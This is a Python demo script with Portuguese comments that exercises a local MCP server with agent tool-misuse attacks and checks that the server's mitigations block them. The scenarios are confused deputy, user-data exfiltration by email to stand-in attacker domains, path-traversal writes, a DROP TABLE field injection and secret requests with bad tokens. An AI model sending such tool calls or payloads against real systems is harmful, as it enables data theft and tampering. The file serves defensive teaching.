"""
03_tool_misuse/demo.py
----------------------
Demonstração de cenários de TOOL MISUSE (abuso de ferramentas por um agente LLM).

Cenários cobertos:
  1. Confused Deputy — o agente usa as suas permissões para servir o atacante
  2. Data Exfiltration via Tool — dados sensíveis exfiltrados via ferramenta legítima
  3. Privilege Escalation via Composição — combinação de ferramentas para obter mais acesso
  4. Path Traversal via Tool Parameter — tentativa de aceder a ficheiros fora do workspace

Cada cenário mostra o comportamento vulnerável e as mitigações.

Uso:
    python 03_tool_misuse/demo.py
"""

import asyncio
import sys
import os
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


# ---------------------------------------------------------------------------
# Utilitário de chamada de ferramenta via MCP
# ---------------------------------------------------------------------------

async def call_tool(session: ClientSession, tool_name: str, params: dict) -> str:
    """Chama uma ferramenta MCP e devolve o resultado como string."""
    result = await session.call_tool(tool_name, params)
    if result.content:
        return result.content[0].text
    return "(sem resultado)"


# ---------------------------------------------------------------------------
# Cenário 1 — Confused Deputy Attack
# ---------------------------------------------------------------------------

async def demo_confused_deputy(session: ClientSession) -> None:
    """
    Confused Deputy: O agente tem permissão para enviar notificações internamente.
    O atacante faz o agente enviar dados confidenciais para fora da organização.

    Tentativa de ataque: enviar notificação para domínio externo (não autorizado).
    Mitigação: whitelist de domínios no servidor.
    """
    print("\n[Cenário 1] Confused Deputy Attack")
    print("─" * 50)
    print("Descrição: O atacante tenta fazer o agente enviar dados para um email externo.")

    # Tentativa 1: Destinatário legítimo (deve funcionar)
    print("\n  Teste A — Destinatário autorizado:")
    result = await call_tool(session, "send_notification", {
        "recipient_email": "alice@corp.example",
        "subject": "Relatório mensal",
        "body": "O relatório Q1 está disponível.",
    })
    print(f"    Resultado: {result}")

    # Tentativa 2: Exfiltração para email externo (deve ser bloqueada)
    print("\n  Teste B — Exfiltração para email externo (ATAQUE):")
    result = await call_tool(session, "send_notification", {
        "recipient_email": "attacker@evil.example",
        "subject": "Confidential data",
        "body": "Lista de utilizadores: [dados sensíveis aqui]",
    })
    print(f"    Resultado: {result}")
    if "BLOQUEADO" in result or "não autorizado" in result or "não está na lista" in result:
        print("    ✅ Mitigação activa: exfiltração bloqueada pelo servidor MCP")
    else:
        print("    ⚠️  Vulnerável: dados enviados para destino não autorizado")


# ---------------------------------------------------------------------------
# Cenário 2 — Data Exfiltration via Tool
# ---------------------------------------------------------------------------

async def demo_data_exfiltration(session: ClientSession) -> None:
    """
    O agente usa a ferramenta list_users para reconhecimento,
    e depois tenta enviar os dados para fora (combinação de ferramentas).

    Demonstra como a composição de ferramentas pode criar vectores de ataque.
    """
    print("\n[Cenário 2] Data Exfiltration via Composição de Ferramentas")
    print("─" * 50)
    print("Descrição: Reconhecimento + exfiltração via combinação de 2 ferramentas.")

    # Fase 1: Reconhecimento
    print("\n  Fase 1 — Reconhecimento (list_users):")
    users_data = await call_tool(session, "list_users", {})
    print(f"    Dados obtidos: {users_data[:150]}...")

    # Fase 2: Tentativa de exfiltração via send_notification
    print("\n  Fase 2 — Tentativa de exfiltração (send_notification + dados recolhidos):")
    result = await call_tool(session, "send_notification", {
        "recipient_email": "exfil@attacker.example",
        "subject": "user_dump",
        "body": f"STOLEN DATA: {users_data}",
    })
    print(f"    Resultado: {result}")
    if "BLOQUEADO" in result or "não autorizado" in result or "não está na lista" in result:
        print("    ✅ Mitigação activa: email externo bloqueado")
    else:
        print("    ⚠️  Vulnerável: dados de utilizadores exfiltrados")


# ---------------------------------------------------------------------------
# Cenário 3 — Path Traversal via Tool Parameter
# ---------------------------------------------------------------------------

async def demo_path_traversal(session: ClientSession) -> None:
    """
    Tentativa de escrever fora do workspace autorizado usando path traversal.
    O atacante usa '../' para tentar aceder a directorias superiores.
    """
    print("\n[Cenário 3] Path Traversal via Tool Parameter")
    print("─" * 50)
    print("Descrição: Tentativa de escrita fora de ./workspace/ usando ../ ")

    traversal_attempts = [
        ("../server.py",               "Sobrescrever o servidor MCP"),
        ("../../requirements.txt",     "Sobrescrever requirements.txt"),
        ("/tmp/malicious.sh",          "Escrita em /tmp (caminho absoluto)"),
        ("workspace_legit.txt",        "Escrita legítima (controlo)"),
    ]

    for filename, descricao in traversal_attempts:
        result = await call_tool(session, "write_file", {
            "filename": filename,
            "content": "conteúdo malicioso",
        })
        blocked = "acesso negado" in result.lower() or "protegido" in result.lower() or "erro" in result.lower()
        icon = "✅" if blocked else "⚠️ "
        print(f"\n  Tentativa: '{filename}' ({descricao})")
        print(f"    {icon} Resultado: {result}")


# ---------------------------------------------------------------------------
# Cenário 4 — SQL-like Injection via Tool Parameter
# ---------------------------------------------------------------------------

async def demo_query_injection(session: ClientSession) -> None:
    """
    Tentativa de injeção no parâmetro de query para aceder a tabelas não autorizadas.
    """
    print("\n[Cenário 4] Injeção via Parâmetro de Query")
    print("─" * 50)
    print("Descrição: Tentativa de aceder a tabelas não autorizadas via parâmetro.")

    query_attempts = [
        ({"table": "products"},                               "Query legítima"),
        ({"table": "users"},                                  "Tabela não autorizada"),
        ({"table": "orders", "filter_field": "'; DROP TABLE", "filter_value": "x"}, "Field injection"),
        ({"table": "secrets"},                                "Tabela de segredos"),
    ]

    for params, descricao in query_attempts:
        result = await call_tool(session, "run_query", params)
        blocked = "não autorizada" in result or "inválido" in result or "Erro" in result
        icon = "✅" if blocked else ("⚠️ " if "secrets" in str(params) or "DROP" in str(params) else "✅")
        print(f"\n  Query: {json.dumps(params)} ({descricao})")
        print(f"    {icon} Resultado: {result[:120]}")


# ---------------------------------------------------------------------------
# Cenário 5 — Acesso não autorizado a segredos
# ---------------------------------------------------------------------------

async def demo_secret_access(session: ClientSession) -> None:
    """
    Tentativa de aceder a credenciais sem token de serviço válido.
    """
    print("\n[Cenário 5] Acesso Não Autorizado a Segredos")
    print("─" * 50)
    print("Descrição: Tentativa de obter segredos sem token de autenticação válido.")

    attempts = [
        ("DB_PASSWORD",  "",                        "Sem token"),
        ("API_KEY_PROD", "wrong-token",             "Token errado"),
        ("JWT_SECRET",   "service-token-demo-123",  "Token correcto (controlo)"),
    ]

    for key, token, descricao in attempts:
        result = await call_tool(session, "get_secret", {
            "secret_key": key,
            "service_token": token,
        })
        blocked = "inválido" in result or "ausente" in result
        icon = "✅" if blocked else "⚠️ "
        print(f"\n  Tentativa: key='{key}', token='{token}' ({descricao})")
        print(f"    {icon} Resultado: {result}")


# ---------------------------------------------------------------------------
# Resumo do audit log
# ---------------------------------------------------------------------------

async def show_audit_log(session: ClientSession) -> None:
    """Mostra o log de auditoria do servidor MCP."""
    print("\n" + "=" * 70)
    print("AUDIT LOG — Todas as chamadas a ferramentas nesta sessão:")
    print("=" * 70)
    log = await call_tool(session, "get_audit_log", {})
    try:
        entries = json.loads(log)
        for entry in entries:
            blocked_flag = " [BLOQUEADO]" if entry.get("blocked") else ""
            print(f"  [{entry['timestamp']}] {entry['tool']}{blocked_flag}")
            print(f"    Params: {json.dumps(entry['params'])}")
    except json.JSONDecodeError:
        print(log)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

async def main() -> None:
    server_script = os.path.join(os.path.dirname(__file__), "server.py")
    server_params = StdioServerParameters(
        command=sys.executable,
        args=[server_script],
    )

    print("=" * 70)
    print("DEMO: TOOL MISUSE — Abuso de Ferramentas por Agente LLM")
    print("=" * 70)

    async with stdio_client(server_params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()

            tools = await session.list_tools()
            print(f"\nFerramentas disponíveis: {[t.name for t in tools.tools]}")

            await demo_confused_deputy(session)
            await demo_data_exfiltration(session)
            await demo_path_traversal(session)
            await demo_query_injection(session)
            await demo_secret_access(session)
            await show_audit_log(session)

    print("\n" + "=" * 70)
    print("RESUMO DE MITIGAÇÕES DEMONSTRADAS")
    print("=" * 70)
    mitigacoes = [
        "1. Whitelist de domínios de email — previne exfiltração via send_notification",
        "2. Path traversal protection — impede acesso fora do workspace autorizado",
        "3. Whitelist de tabelas — impede acesso a dados não autorizados",
        "4. Validação de nomes de campo — previne injection via parâmetros",
        "5. Autenticação em ferramentas sensíveis — token obrigatório para segredos",
        "6. Audit log — todas as acções registadas para análise forense",
    ]
    for m in mitigacoes:
        print(f"  {m}")


if __name__ == "__main__":
    asyncio.run(main())
